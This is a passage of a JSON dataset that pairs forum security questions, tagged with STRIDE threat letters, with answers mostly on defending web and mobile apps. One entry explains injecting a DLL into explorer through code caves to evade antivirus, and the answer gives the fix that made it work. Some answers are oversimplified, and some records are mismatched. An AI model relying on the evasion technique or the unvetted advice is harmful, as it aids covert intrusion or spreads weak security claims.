    "Mitigation": " We decided to use HTTPs instead of HTTP, but after googling iunderstood that SSL only is not enough.I'm not sure what you've googled, but SSL/TLS, when used correctly, can protect you against MITM attacks.If this solution (SSL + symmetric encryption algorythm) is ok, couldyou please advice most suitable encryption algorithms for this kind ofissue?Encryption in SSL/TLS is already done using symmetric cryptography. Only the authentication is done via asymmetric cryptography.As i understand, there are two main vulnerabilities while using SSL:There are many CA provider companies now, so nobody is protectedfrom MITM attack, where normal certificate is used by crackers (ifound some articles, where it was said that VeriSign had secretdepartment, that was providing secret services for MITM, when VeriSignwas the only CA worldwide) 2) Most MITM attacks are possible whileusing ARP Cache PoisoningProtecting against MITM attacks is exactly the purpose of the certificate. It is solely the responsibility of the client (a) to check that HTTPS is used when it's expected and (b) to check the validity of the server certificate.The first point may be obvious, but this is the kind of attacks that tools like sslstrip do: they're MITM downgrade attacks that prevent the user to get to the HTTPS page at all. As a user, make sure you're on an HTTPS page when it should be HTTPS. In a corporate environment, tell your users they must check that they're accessing your server via HTTPS: only they can know (unless you want to use client-certificate authentication too).The second point (the certificate validation) is also up to the client, although most of it is automated within the browser. It's the user's responsibility not to ignore browser warnings. The rest of the certificate validation tend to be done via pre-installed CA certificates (e.g. Verisign's).If there's an MITM attack taking place (perhaps via ARP poisoning), the user should be get an incorrect certificate and should not proceed. Correct HTTPS verifications should allow you to have a secure connection or to have no connection at all.The vulnerabilities you're mentioning have to do with the certificate verification (the PKI model). Indeed, verifying that the server certificate is correct depends on the CA certificates that are trusted by your browser. There, any trusted CA could issue a certificate for any server in principle, so this model is a good as the weakest CA in the list. If one a the trusted CAs issues a fake certificate for a site and gives it to another party, it's as good as having a passport office issuing a real &quot;fake&quot; passport. It's quite tricky to counter, but there are ways around it.You could rely on extensions like the [LINK], which monitor certificate changes, even if both are trusted. Such a warning should prompt the user to investigate whether the certificate change was legitimate (done by your company) or not.More radically, you could deploy your own CA, remove all the trusted CA certificates from the user browser and install only your own CA certificate. In this case, users will only be able to connect securely to machines that have certificates issued by your CA. This could be a problem (including for software updates if your browser uses the OS certificate repository).In principle, you could avoid certificate altogether and use [LINK] cipher suites. However, this is not supported by all SSL/TLS stacks, and not necessarily adapted for HTTP over TLS (lacking specification regarding the host name verification, as far as I know).You may also be interested in these questions on Security.SE:[LINK][LINK] "
  },
  {
    "Threat": "T",
    "Attack": " I'm writing a web application that does some client side encryption of data to ensure that I never get to see what the client is sending to my server. What I am really worried about is if a third party gets access to my JavaScript code and then adds a back door or some other malicious code to my JavaScript file. ",
    "Mitigation": " Unless the scripts are dynamic, you could store their hashes in database and compare client-side. See [LINK] "
  },
  {
    "Threat": "S",
    "Attack": " I'm worried that people can pretend to be the app and do things on behalf of my client_secret. If someone with malicious intent creates an unauthorized app and sends requests to my server, they could theoretically do malicious things on my application's behalf.  ",
    "Mitigation": " Only risk of DOS against your client credentials. The responses are only ever acknowledged and forwarded to the specified redirect Uri, so requests can be made on your behalf for tokens, but only your server will ever receive the tokens (assuming the user agent is decent), you should deal with the case where you receive unknown token responses.[LINK]  Risk of User installing a malicious app. When you lose the [CODE], [CODE] and the [CODE] (you have no way to keep these private against debugging of the device), then anybody will be able to make apps on your behalf. This is an unfortunate problem for mobile apps. The only defence is the User consent screen for now, that is, hopefully the User notices by looking at the consent screen that they have been duped into installing a malicious app from the store instead of your legitimate app. "
  },
  {
    "Threat": "I",
    "Attack": " I'm using Spring 2.5 at the moment, but upgrading slowly to Spring 3. What would you suggest me to keep the passwords safe? I know this question has been answered in similar forms here and there, but I would like to see some exact, up-to-date answer about how to do that, which could also protect against today's password hacking techniques. ",
    "Mitigation": " Yes, you should use bcrypt/jBCrypt.   bcrypt is specifically designed to be slow, so it would take an infeasible amount of time to crack a password. "
  },
  {
    "Threat": "S",
    "Attack": " I'd like to talk about bearer token today. Bearer token is passed as a header. Headers are not encrypted might not be encrypted?, therefore, it could be possible for someone to grab said token and impersonate the user without consent. This is my view on a bearer token. It seems many popular services today use this method of authentication for API's. ",
    "Mitigation": " Headers are encrypted using HTTPS - Bearer token is perfectly fine for security and I am using it in my enterprise application now. "
  },
  {
    "Threat": "I",
    "Attack": " Lately, I've been thinking a lot about the security of the app I'm working on. The client side is built on Angular with a Rails API backend. From what I can gather, the general consensus is, if it's on the client, assume it can be compromised. So this makes me wonder when and if I should be using something like [CODE] for a route or if I should instead check authorization every time on the server for route requests. I thought of putting the auth request to the server in the [CODE] but I assume [CODE] can be hacked to respond [CODE], bypassing the need for the server response? If so, what's the point of something like [CODE] if it's just a glass door?  The AuthGuard checks if the user is logged in and redirects to login if not authenticated. As you said, like anything on the client side this could be compromised. That's why the secret data of your SecretsTable should come from a protected API call. Even if the data is static (the same for any user) you would not just include it in your client application but protect it with this API call. ",
    "Mitigation": " The AuthGuard checks if the user is logged in and redirects to login if not authenticated. As you said, like anything on the client side this could be compromised. That's why the secret data of your SecretsTable should come from a protected API call. Even if the data is static (the same for any user) you would not just include it in your client application but protect it with this API call. "
  },
  {
    "Threat": "I",
    "Attack": " The reason I am need this capability is that I'm using the AES encryption to implement a one time password (OTP) scheme.  When the client logs into the server it is given a seed.  The first OTP is generated by encrypting this seed.  For each subsequent request the client encrypts the last OTP using the shared AES key between the server and the client.  Hence, even if an attacker sniffed the last OTP without the shared key they would not be able to get the next OTP.  The OTP is being encrypted with AES in CBC mode.  The problem comes if the server and client get out of sync.  The way I was planning on dealing with this was by generating a few OTP's into the future on the server side and seeing if any of them matched the client's.  However, without a way to deterministically calculate the IV for each encryption iteration this is not possible.  I know that CBC is meant to eliminate both of these problems.  By chaining blocks it eliminates the multi block statistical attack of ECB.  By never using the same IV for the same AES key you eliminate the problem of having the same plaintext encrypt to the same output with the same key. ",
    "Mitigation": " As stated in the comments, I would avoid to invent a protocol at all cost and rather try to implement a standardized protocol. Some OTP protocols require the clients to use a second, out-of-band device for receiving the OTP when logging into a server, a common scenario with banks is that upon your login request to the server application the server will send you an OTP to your cellphone. The OTP generators for client and server are typically time-synchronized or counter-synchronized, if I understood correctly you plan to use the latter solution. I didn't find in your description how you would intend to manage the client's counter, on a separate device?Anyway, I would recommend to use a standardized procedure that has been &quot;tested in the field&quot; rather than rolling my own scheme. [LINK] could be what you are looking for - although it uses a keyed HMAC solution rather than symmetric encryption, but this should make things easier as you don't have to worry about the IV anymore.In any case you should plan early on how you want to accomplish establishing the symmetric keys with your clients. If you can't handle this over a secure channel (such as handing out keys in person) this will become a problem for the security of the entire system. "
  },
  {
    "Threat": "D",
    "Attack": " I am in charge of a few live websites made in Ruby on Rails.  I have a few IP adresses that keep attacking these sites and I would like to block their IP adresses.  I know they can get around this wall with a proxy but I do wish to make it harder for them and would love to know where I need to set this up in my ruby on rails app.  Thank you everyone! ",
    "Mitigation": " [CODE]  Thanks to: [LINK] "
  },
  {
    "Threat": "D",
    "Attack": " I can observe in the log files, that the page is \"attacked\" quite often by brute force scanners.   Searching for known vulnerabilities, e.g. WordPress files, etc. which result in [CODE] responsesLogin attempts with default user credentials  ",
    "Mitigation": " If you want to block malicious IP's, you should really look into [CODE]. [LINK] explains it perfectly:  <h1>Creating the Authentication Failure Handler</h1>  [CODE]  <h1>Add it to your configuration:</h1>  [CODE]  <h1>Creating a custom fail2ban filter for Symfony2</h1>  To create a new filter for fail2ban, we'll create a file in /etc/fail2ban/filter.d/symfony.conf with the following contents:  [CODE]  That was easy, right? We should create a jail in /etc/fail2ban/jail.local which uses our new filter. The definition for this jail will depend on your configuration, but a basic one could look like this:  [CODE] "
  },
  {
    "Threat": "T",
    "Attack": " I have a single page application, having sensitive content, and needs to be secured. This question is specific with securing against XSS and CSRF attacks.  Based on these answers, for secured contents, it is suggested to use cookies with \u9225\u699fttpOnly\u9225?and \u9225\u69aeecure\u9225?options to avoid XSS; and implement CSRF protection by ourselves (something like [LINK]) (Note that I am not on Asp .net, but at java stack).   Thought these blog and conversation are somewhat old, and with time, the scenario has changed somewhat. Now with [LINK] with strict policy, risk of XSS attack can be minimized significantly. Also CSP is [LINK]. Considering XSS security with CSP, now I feel, it is good option to use localStorage instead of cookies to avoid CSRF.  Cookies [httpOnly and secure] + \u9225\u6de2anual\u9225?implementation of CSRF anti-forgery-token?  XSS  Authentication tokens are one of the many potential targets of a XSS attack, and storing them as http_only helps in protecting them, but it is by far not enough to keep attackers out.  CSRF  Using local storage to store that CSRF key (if you are sure all your visitors support it) would be a possibility but you add problems if the assumption that all browsers support it is not true (they'll all generate CSRF violations)  Means the browser is instructed to not let javascript access to this cookie.This helps somewhat to minimise access by XSS attacks to this cookie (but not to other things of interest to the attacker)  Use the authentication token as a cookie, with https_only and secure options.If you are sure all your clients are capable of local storage, you can add a CSRF key to local storage and add javascript that extracts it and sends it to the server in every form and on every button that makes a change. If you keep both keys separate you get the best of both worlds.BUT: you still have to check the CSRF key to be present and valid on every request that changes anything.  Personally I feel this is too soon, and just using a traditional CSRF key in every form generated by the server is for now easier than having to rely on assumptions about browsers and/or providing fallback mechanisms that do the same as the old thing and having to maintain 2 methods.  CSP is nice, but by far not in every browser out there. And if you rely on it to stop XSS, I'd consider it as a \"belt and suspenders\" approach, not as the only solution. The reason is simple enough: someday you get too much load and decide to a a CDN ... oops now the CDN needs to be allowed to load images, scripts etc. and now the XSS door is open to any other user of that CDN ... Maybe the one opening that door didn't even consider XSS as something they would need to worry about. ",
    "Mitigation": " Use the authentication token as a cookie, with https_only and secure options.If you are sure all your clients are capable of local storage, you can add a CSRF key to local storage and add javascript that extracts it and sends it to the server in every form and on every button that makes a change. If you keep both keys separate you get the best of both worlds.BUT: you still have to check the CSRF key to be present and valid on every request that changes anything. "
  },
  {
    "Threat": "I",
    "Attack": " The way I imagine the design is to put the data on the eMMC, encrypt it with AES (128bit key is enough?). The keys will be stored on the flash memory of the MCU. The MCU I use provide functionalities to prevent flash read-out, and flash overwrite. However, the eMMC with the data (but without the encryption key) will be available to a hacker if he just hard-wires the eMMC to its computer.Therefore the decrypted data will only temporary live in the RAM of the system. ",
    "Mitigation": " You can Store your keys in general SRAM memory and protect system with tamper detection keys,or use MCU with built-in crypto co-processor and secure key storing(e.g. lpc18s,lpc43s and etc.)or use a external cryptographer chip like TPM or SAM for boosting your security level.But as said it before at first you must decide how &amp; when you need to en/decrypt data , Is this needed to transmit plain data(decrypted information) in unsecured data lines?You can receive more information in below link which I asked a while ago:[LINK] "
  },
  {
    "Threat": "I",
    "Attack": " How sensitive are Cocoa input elements to malicious attacks?  What would be the best way to protect saved data which is stored using Core Data? ",
    "Mitigation": " Objective-C is a dynamic language, which means that it is possible to replace classes and specific methods of classes at runtime. For example, this is how the 1Password plugin finds its way into Safari, and Dropbox finds it way into the Finder. It is currently possible for a malicious attacker to use the low level mach_inject API, or a number of other slightly higher-level methods, such as SIMBL or OSAX injection, to load code into your app. Once code is loaded into your app, the dynamic nature of Objective-C makes it possible in theory to replace NSTextField with a subclass of the attacker's choice, or specific methods in the class, including listening and storing user input. The secure version of NSTextField, which is designed for passwords, may have some protections against this, though I haven't found specific documentation to that effect. Security.framework and the keychain APIs in general do have protection for your data in memory, and they are not based on Objective-C, so it is significantly harder (although maybe still possible) to interfere with them. "
  },
  {
    "Threat": "T",
    "Attack": " I would like to prevent XML External Entity attacks by disabling DTDs (Document Type Definitions) completely, so I'd like for the validator to throw an exception in case of a DTD in my xml if possible. I have read about doing this using [CODE]. How do i do configure this in Validator? ",
    "Mitigation": " According to the [LINK] for Java, the following should work:  [CODE] "
  },
  {
    "Threat": "I",
    "Attack": " Is this secure? If the hash is compromised, the attacker has the salt used to hash the password... There's something I miss here.I'm here really free to bother about salting passwords? Can I really rely on PHPass? ",
    "Mitigation": " Yes, it would be marginally more secure if the salt was secret, but that's hard to realize in practice, since your application needs the salt as well, so it needs to be stored somewhere where the password is accessible as well. Therefore, in practice, when the attacker gets the password hash, he's typically also able to get the salt anyway. "
  },
  {
    "Threat": "E",
    "Attack": " Recently Struts patched a vulnerability allowing attackers to execute remote code. Apparently not patching this is like giving black-hats a red carpet welcome with a bandwagon.[LINK]Basically it allows attack command execution like this :Legit action :[CODE]Exploited action :[CODE]While I know that upgrading should be done ASAP, the as soon as possible will mean some time since our code base uses old struts versions and plugins.Which will require some refactoring to upgrade the Struts 2 libraries, then those need to be tested etc.My question therefore is whether anyone has any idea to stop this vulnerability from being executed? This will be only till we are able to upgrade.I was wondering whether writing an interceptor to sanitize the URL before being evaluated against the OGNL is possible and if so will it mitigate this issue?Other idea I had was to use the Java security manager somehow to stop arbitrary process invocations, is this possible? Will it patch the hole temporary?The server being used is jBoss if anyone think that's relevant. ",
    "Mitigation": " The problem is related to [CODE] and how it handles special parameters. This class could be extended to override [CODE] method. However, if you turn off [LINK] these special parameters no longer work. Use the constant configuration[CODE] "
  },
  {
    "Threat": "T",
    "Attack": " I've got a fully custom PHP site with a lot of database calls. I just got injection hacked. This little chunk of code below showed up in dozens of my PHP pages.  ",
    "Mitigation": " And this one doesn't looks like SQL injection.  Most of time it's just a trojan horse at your PC, stealing FTP password.  to see the actual code, replace eval with echo. But I doubt it has anything interesting "
  },
  {
    "Threat": "T",
    "Attack": " This gives the attacker a remote shell and since the owner of the file is apache, the attacker could basically move around my entire [CODE] where mysql passwords were stored along with other configuration information. ",
    "Mitigation": " What you will probably want to do is set up a chroot to some random temp directory on your filesystem for the user running your scripts. Here is some reading on [LINK], and some [LINK].  I would suggest you also install a security module such as suExec or [LINK] for Apache. Then, within your Apache's VirtualHost (if you are not running a virtual host, do so!),  assign a specific UserID to handle requests for this specific VirtualHost. This separates the request from the Apache default user, and adds a little security.  [CODE]  Then, harden PHP a little by setting the following PHP options so the user cannot access files outside of the specific directories, and move your [CODE] and [CODE] within this directory. This will prevent the users access outside of their base directory.  [CODE]  Along with the lines of PHP, prevent access to specific [LINK] and [LINK], and read up on [LINK].  Also, I would have you look into for that user, disabling access to [CODE] and [CODE], to prevent a script from attempting to access root privileges. Learn more, [LINK]. "
  },
  {
    "Threat": "I",
    "Attack": "",
    "Mitigation": " Disabling HTTP compressionSeparating secrets from user inputRandomizing secrets per requestMasking secretsProtecting vulnerable pages with CSRFLength hidingRate-limiting requests  HTTP compression can fairly easily be disabled at the server, at the expense of efficiency.  The [LINK] addresses points #4 and #6. It is likely to break caching and increase page size.  [LINK] works on point #4, with none of the negative impacts on efficiency, but it does require javascript (which can help cut down on spam submissions, anyway). "
  },
  {
    "Threat": "T",
    "Attack": " Can an attacker attach a debugger to my app after installing it to the market, or does the app have to be marked as debuggable first?  How secure is this?  Are there ways to get around it? ",
    "Mitigation": " Marked debuggable or not, if a hacker has your code on his/her machine he/she will be able to use a variety of tools to attach to your process, examine the code, the memory, execute arbitrarily etc. This goes for any app and any platform. Your best hope is to follow security best practices and obfuscate to make it hard for someone to crack your code. "
  },
  {
    "Threat": "T",
    "Attack": "",
    "Mitigation": " There are many options you can do but the best is to not accept any important values from the client. Have the server do all the calculation and than send the values to the client. "
  },
  {
    "Threat": "T",
    "Attack": " I have suffered a number of XSS attacks against my site. The following HTML fragment is the XSS vector that has been injected by the attacker: ",
    "Mitigation": " So to summarize the comments:Sticking a character in front of the quote, turns the quote into a part of the attribute value instead of marking the beginning and end of the value. This works just as well:  [CODE] "
  },
  {
    "Threat": "T",
    "Attack": " We recently got a call from one of our clients, complaining that their site has some \"strange looking code\" at the bottom of the page. We checked out the source code, and discovered that about 800 bytes of malicious javascript code had been appended to the [CODE] file, after the [CODE] tag. I won't post said code because it looked particularly nasty.  As far as I can tell, there would be no way for this file to be edited in any way, unless someone had direct access to the server and/or FTP login details. The actual file itself has been modified, so that rules out any kind of SQL attack. Besides a person physically gaining credentials and hand-modifying this file, would there be any other logical explaination for what happened? Has anyone else had experience with something like this happening? ",
    "Mitigation": " The places I'd check are:  File modification times (to see when it happened)HTTP server logs for signs of funny-looking GET params (eg, [CODE])FTP server logsSSH logs (something similar happened to me once, and it was because someone gave out their password)  Also, I'd immediately restrict write access to all the site's files, just to be safe from the same attack (of course, the vector is still open, but it's better than nothing). "
  },
  {
    "Threat": "S",
    "Attack": " I don't understand how this could be the case - having very different login pages for different applications still leaves users more vurnerable to phishing and other attacks. Am I incorrect in this conclusion? Every question on SO about this appears to be about using an external or public Provider, and the counterargument I'm encountering is that those concerns don't apply in a private Provider limited to sites on the same domain. ",
    "Mitigation": " The general concerns about having OpenID within an iframe do have some validity even if you role your own provider. If any of your components are vulnerable to script injections there's a risk that they could compromise your users credentials since you could access iframe data from the parent window.  The normal recommendation to redirect (optionally in a [LINK]) would limit this risk since the attacker now need to inject into the OpenID login page where you presumable have no script injections flaws. "
  },
  {
    "Threat": "T",
    "Attack": " It seems the intention is to prevent maliciously injected Javascript from sending private data to the attacker. However, sending data to any domain is easily possible with an injected [CODE] or [CODE] tag (or any other external resource for that matter). ",
    "Mitigation": " If any arbitrary website could make an XHR call to your website, then the following could happen:  Innocent user Alice logs into your secure website and acquires a secure session cookie.In another browser tab, Alice visits Bob's evil hacker website (which she thinks is just a Justin Bieber video)Bob's page issues an XHR to your secure website. Without the cross-domain policy, the browser would issue the request to your website &mdash; including the secure session cookie &mdash; and retrieve the results. Those results could include anything available to Alice while she's logged in to your secure site.  As it is, even with the cross-domain policy, Bob's evil website can in fact POST an HTTP request to your server by posting a form. It won't be able to see the results, but if Bob is clever he may have discovered a URL in your site that allows some activity from a POST even if it's not from a form on one of your pages. That's called Cross-Site Request Forgery, and it's something the browser cannot protect you from. "
  },
  {
    "Threat": "T",
    "Attack": " I'm trying to inject a 64 Bit DLL into 64 Bit Process (explorer for the matter).I've tried using Remote-thread\\Window Hooks techniques but some Anti-Viruses detects my loader as a false positive.After reading this article : [LINK], I decided to use code caves.It worked great for 32bit but because VS doesn't support inline assembly for 64 Bit I had to write the op-codes and operands explicitly.I looked at this article : [LINK], as the article states, there are some differences:   ",
    "Mitigation": " Apparently, The main problem was that I allocated the code cave data without the EXECUTE_PAGE_READWRITE permission and therefore the chunk of data was treated as data and not as opcodes. "
  },
  {
    "Threat": "T",
    "Attack": " If I'm reading [LINK] correctly, using [CODE] like this is vulnerable to XSS attacks. ",
    "Mitigation": " The output of [CODE] is safe for use in the nested context of JS-inside-HTML-text or JS-inside-HTML-quoted-attribute-value. It doesn't make safe for use in JS-inside-HTML-unquoted-attribute-value (but then neither does [CODE] for unquoted HTML attributes, so always quote in any case). "
  },
  {
    "Threat": "I",
    "Attack": " I'm trying to create an AJAX script that will take two GET variables, class and method, and map them to methods we've designed (similar to how CodeIgniter acts for ajax, I'm pretty sure). Since I'm relying on user input to determine what class and method to execute I'm worried that there may be some way for a hacker to use that technique to their advantage. ",
    "Mitigation": " [CODE]  Combine with some of the other answers for best results. Requires PHP 5.3.0 or higher. You could even implement an interface  [CODE]  This approach follows OOP principles, is very verbose (Easy to maintain) and doesn't require you to maintain an array of which classes can be called and which cannot. "
  },
  {
    "Threat": "T",
    "Attack": " Is there any danger in doing this? Is there anything the user can set it to that can compromise the system or in any way do damage? ",
    "Mitigation": " Providing a [CODE] of anything other than the null string will prevent an attacker from forwarding a user to a remote domain,  which could be useful for Phishing.  Redirecting to the same domain could be useful to the attacker if are checking the referer as a form of CSRF prevention,  but that is a weak form of protection that you really shouldn't be using anyway.  Even with a base,  the attacker can change the path by supplied a value like: [CODE],  but this is still relative to the originating domain which in most cases is safe.   One great way to deal with unvalidated redirects is to avoid the problem entirely by not using a REQUEST variable.  Instead store it in a [CODE],  and use that for the next request. To be a bit more robust,  you could say [CODE],  or something page specific.     Another option is to use a white list,  create a list of all values you would like to accept,  and make sure the user supplied value is in your list.   "
  },
  {
    "Threat": "T",
    "Attack": " After reading [LINK], it is clear that allowing image uploads from users opens you to XSS attacks.  I wasn't able to find any PHP examples of how to screen an uploaded image for XSS attacks.  What do you recommend to prevent XSS attacks within an uploaded image? ",
    "Mitigation": " As long as you keep the extension correct (and your users are diligent about updating their browser) image injection should not be possible. "
  },
  {
    "Threat": "S",
    "Attack": " I am developing a mobile application which sends some encrypted data to a Bluetooth device and this Bluetooth device sends the data to server. My question is that in this case how can I prevent replay attacks. Someone might use a fake Bluetooth device to get the signals and send them to the server. ",
    "Mitigation": " One way to do this would be to use a counter, but allow it to skip a large number of steps. For example if the last counter value you've seen from phone A is 123 and you get something with a counter value of 156 then you accept it, but anything outside the range of [124, 1000123] you discard (1000000 being completely arbitrary and dependent on your use case). "
  },
  {
    "Threat": "D",
    "Attack": " Real user will not see this field, therefore they will leave it blank, where as spam bots will fill it in. I can then check if \"surprise\" field is empty or not and if it is empty continue stuff. ",
    "Mitigation": " What you have here will probably help to deter spam but it is far from a complete solution. A proper CAPTCHA will get you a lot further, but depending on your needs and usage scenarios, your solution might be adequate. "
  },
  {
    "Threat": "T",
    "Attack": " Is there a way (in CF or JS) to easily prevent XSS attacks across the entire site? ",
    "Mitigation": " XSS is an Output problem, not an Input problem. Filtering/Validating input is an additional layer of defence, but it can never protect you completely from XSS. Take a look at [LINK] - there's just too many ways to escape a filter.There is no easy way to fix a legacy application. You have to properly encode anything that you put in your html or javascript files, and that does mean revisiting every piece of code that generates html. "
  },
  {
    "Threat": "S",
    "Attack": " I'm using Codeigniter and I want to prevent CSRF attacks attempts that may happen. And to achieve this I add a hidden input tag with a random token to each form I want to protect, and in the same time I keep this token in a session to compare against when begin handling this form data. ",
    "Mitigation": " To solve this problem, you could create a token string with a unique key and store the pairs of keys/tokens in the session (as userdata in CodeIgniter). "
  },
  {
    "Threat": "I",
    "Attack": "",
    "Mitigation": " Generate a double-length key, and use the first half of the derived key for authentication, and the second half for encryption. (erickson)Use a separate salt for each key.Appending a unique but hard coded salt (like \"website\" and \"encryption\" respectively) to each before deriving the key. A unique salt should be used in addition.(Damien_the_Unbeliever) "
  },
  {
    "Threat": "T",
    "Attack": " We're planning to build a web application that needs to be highly secure because a lot of money and reputation is at risk. Therefore I'm looking for tools and technologies that help in that endeavor. The tools and technologies should help prevent things like SQL injection, cross-site scripting vulnerabilities, remote code execution etc.  A simple example: If you insert data into HTML, it needs to be escaped so it's properly displayed and not misused for injecting scripts. Some web application frameworks put this burden on the developers. If they forget the escaping in one place, they've got a security problem. A good tool wouldn't just do the escaping automatically, it would even prevent the developers from doing it forcefully.  Prepared statements. The [LINK] implementation for Java is the de facto standard for accessing DBMSes at the SQL level. You write SQL queries with variables, and then specify the values of those variables and their types, effectively giving the DBMS enough information to escape your data while leaving your query structure (the control) alone.Query builders. Instead of specifying a query as a string, you can represent it as a sequence of method calls that gradually build up an object, in the fashion of the builder pattern. You might think of it as building up an AST by hand and then serializing it as a query string. There is a [LINK] by Robertson and Vigna that illustrates some examples in Haskell.LINQ. This is specific to .NET. Queries are effectively part of the language, so the parser can distinguish between query keywords and data. Once again, this allows the language to safely escape only the data. Due to my lack of experience with LINQ I can't say much more, but presumably data values are wrapped in [LINK] objects that are subsequently escaped.ORM frameworks. A level above SQL injections, ORM frameworks aim to abstract away most of the DBMS details, including the queries themselves. They may use prepared statements behind the scenes, or even expose a prepared-statement-like API for more direct access to the database (for example, Hibernate's [LINK]).  Many of the techniques for preventing XSS attacks are similar in spirit to defenses against SQL injections. Only this time, the target is the web browser instead of the database. Either way, we don't want data to be mistakenly interpreted as control. ",
    "Mitigation": " <h2>SQL Injections</h2>  Prepared statements. The [LINK] implementation for Java is the de facto standard for accessing DBMSes at the SQL level. You write SQL queries with variables, and then specify the values of those variables and their types, effectively giving the DBMS enough information to escape your data while leaving your query structure (the control) alone.Query builders. Instead of specifying a query as a string, you can represent it as a sequence of method calls that gradually build up an object, in the fashion of the builder pattern. You might think of it as building up an AST by hand and then serializing it as a query string. There is a [LINK] by Robertson and Vigna that illustrates some examples in Haskell.LINQ. This is specific to .NET. Queries are effectively part of the language, so the parser can distinguish between query keywords and data. Once again, this allows the language to safely escape only the data. Due to my lack of experience with LINQ I can't say much more, but presumably data values are wrapped in [LINK] objects that are subsequently escaped.ORM frameworks. A level above SQL injections, ORM frameworks aim to abstract away most of the DBMS details, including the queries themselves. They may use prepared statements behind the scenes, or even expose a prepared-statement-like API for more direct access to the database (for example, Hibernate's [LINK]).  <h2>Cross-site Scripting (XSS)</h2>  Templates. Most of the popular templating languages seem to be targeted at PHP, Python, or Ruby. However, there are a few out there [LINK] and [LINK]. A template usually consists of HTML and placeholders for data to go. You then pass your data into the template engine, it escapes it all, and then it renders the template with the placeholders replaced with the sanitized data.DOM tree builders. Similar to the SQL-query builders, you might construct a page using a DOM-like API to create new elements and text nodes, and finally serialize them as an HTML string at the end. Debatably, the standard DOM API is unfortunately too verbose for this approach to be palatable.XML literals. Like LINQ, XML literals are a native part of a language that allows the parser to distinguish markup from data. While neither Java nor C# support XML literals, [LINK] and [LINK]. Facebook has an open-source PHP extension called [LINK] that provides several software engineering benefits as well, including component reuse and being able to specify content models for custom tags.Heuristics and detection. This isn't a sure-fire defense, but some systems examine the HTML output and guess if malicious script is embedded. However, as people discovered with IE8, this can [LINK].HTTP-only cookies. This is not a defense against XSS, but it can prevent quite a few attacks. When your server sets a cookie, it can mark it as [LINK], meaning that supported browsers won't let JavaScript on a page access that cookie. Thus, even if an attacker is able to embed malicious script on your site, they won't be able to steal your user's cookies, provided they have a reasonably modern browser (even IE6+ counts!).  <h2>Remote Code Execution</h2>  I don't have much to say on this topic, but try to minimize [CODE]-like calls as much as possible. If you have to make calls to other binaries, apply good security practices such as using a whitelist where possible and using well-vetted sanitization functions where appropriate. Some APIs, like Python's [LINK], do a nice job of ensuring that arguments aren't treated as shell control characters. Finally, with Java and C#, buffer overflow exploits are highly unlikely. It's not a formal guarantee, but billion-dollar companies run Java servers all the time.  Ultimately, you should consider using an API or language features that are designed for the task at hand, whether it is creating a SQL query or building an HTML page. Not only do these languages and APIs increase your confidence with regard to security, but they often facilitate programming as well. Compared with the old-school tactic of concatenating a bunch of strings, we now have LINQ and XML literals that arguably make code easier to write, easier to read, and also easier to verify. I'm a fan of language enhancements and APIs that improve both code quality and programmer productivity! "
  },
  {
    "Threat": "I",
    "Attack": " I'm developing a website and am sensitive to people screen scraping my data.  I'm not worried about scraping one or two pages -- I'm more concerned about someone scraping thousands of pages as the aggregate of that data is much more valuable than a small percentage would be. ",
    "Mitigation": " Forget about it. If it's on the web and someone wants it, it will be impossible to stop them from getting it. The more restrictions you put in place, the more you'll risk ruining user experience for legitimate users, who will hopefully be the majority of your audience. It also makes code harder to maintain.  "
  },
  {
    "Threat": "S",
    "Attack": " If my app goes on the appstore, is it going to be dangerous for me? Maybe some people will extract my secretKey and my key to use it for other purposes?Is there a way to protect my app from this kind of attacks? ",
    "Mitigation": " If possible you shouldn't store your keys in your app. "
  },
  {
    "Threat": "E",
    "Attack": " My firewall is setup so that it is preventing any outside access to the mail-server except from the websites IP.  A follow-up Q is, if a spam-bot or whatever, gets the hold of my forms and fills alot of them out, or use my mail-server to send emails, what would happen then? ",
    "Mitigation": " I go by the design principle of \"least barrier to entry\". You want people to use your site, so you want to make it as easy as possible for them. Anything at all -- including a captcha -- might turn them away. So my standard line would be to definitely not include a captcha anywhere until you've actually seen a problem with spam. And even then, see if the problem can be solved without a captcha first.  Regarding your question of \"well what if a spam bot starts spamming\". Simple solution to this is to pre-implement a rate limit. Make it so that someone at a given IP address cannot initiate the sending of an email more frequently than say once every minute. This will not actually cause a problem for real people, but will stop a spam bot in its tracks. You can even try to detect situations where you see a high rate and temporarily block that IP address for 24 hours. That will prevent even the once-a-minute spam. "
  },
  {
    "Threat": "I",
    "Attack": " But I doesn't find it secure. I suppose it can be decrypt by hackers. I need proper 100% encryption and decryption security of Sqlite Database. ",
    "Mitigation": " Personally I recommend as per your needs SQLCipher is the best one to go for.I have tried it.Its highly recommended Open-Source System. "
  },
  {
    "Threat": "I",
    "Attack": "   Some people have said yes  because now they have 2 ways to  possibly crack it. Duh, I know that.  What I'm asking about is whether one  can be used to make cracking the other  easier? Can the very fact that the  field has 2 variations somehow make it  easier for the attacker to use one to  make cracking the other easier? Look at it this way: if the  attacker is given only variant A, it  would take them a day. If given only  variant B, it would take them 3 days.  If the attacker runs both cracks  independently, they would crack variant A  faster (it takes only a day). But if the attacker is given  both, they can crack one in just 6  hours. This is what I'm asking. ",
    "Mitigation": " Assuming that the hash and encryption method are cryptographically strong, then the attack would be brute force. So the cost would be to run the weaker of the two: hash or encryption. If the hash is computed with a large number of iterations (e.g., with PBKDF2) and the encryption is a simple application of a password run through a single iteration of a hash function to get the key data, then the encrypted value would actually be the weak point in terms of CPU cost.  In that situation, the answer would be that storing both does not really weaken it, but rather that the encrypted value weakens it. "
  },
  {
    "Threat": "S",
    "Attack": " My thought was that I would store the username and hashed password on the user's computer and that this username and hash would be sent in plain text over an unencrypted http connection to the server for validation. This of course will not prevent a hacker from using someone else's username and password hash as their own without knowing the source password (with some code tweaks).  Would a malevolent individual be able to do anything with a hashed password and code used to produce the hash? (other than log in as an other user if they obtained this information)What do other client-side applications do to prevent one user from logging in as an other user, if the hacker does not have access to the source password? (for example Steam)Is there an easy, cheap (both cost and time), more secure way to handle this?  Legit user signs in for the first time, credentials get storedHacker gains access to the file system, locates username and hashed passwordHacker modifies source code (or uses code injection) to send the acquired username and hashed password instead of what the program would normally do ",
    "Mitigation": " The solution is clear. If it hurts when you do that, don't do that. Do not store a password equivalent if the system which stores it cannot be trusted to be robust against attack.   But better to not store the password equivalent in the first place.  Like I said, this is hard stuff. Don't try to do it yourself. Get a professional. "
  },
  {
    "Threat": "D",
    "Attack": " I understand the need for putting a web server in a DMZ and blocking inbound traffic to all ports except 80 and 443. I can also see why you should probably also block most outbound traffic in case the server is compromised. ",
    "Mitigation": " The only reason I can think of is if your machine is somehow compromomised remotely then it won't be able to DDoS another website on port 80. It's not something I normally do though. "
  },
  {
    "Threat": "S",
